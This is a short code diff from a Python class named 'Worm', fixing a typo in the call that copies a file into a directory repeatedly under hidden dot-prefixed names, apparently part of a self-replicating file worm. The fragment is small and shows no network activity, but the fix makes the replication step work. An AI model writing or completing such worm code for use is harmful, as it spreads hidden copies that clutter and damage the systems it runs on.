@@ -52,7 +52,7 @@ class Worm:
                     source = abs_path
                     for i in range(self.iteration):
                         destination = os.path.join(directory, ("."+file+str(i)))
-                        shutnil.copyfile(source, destination)
+                        shutil.copyfile(source, destination)
     
     def start_worm_actions(self):
         self.list_directories(self.path)
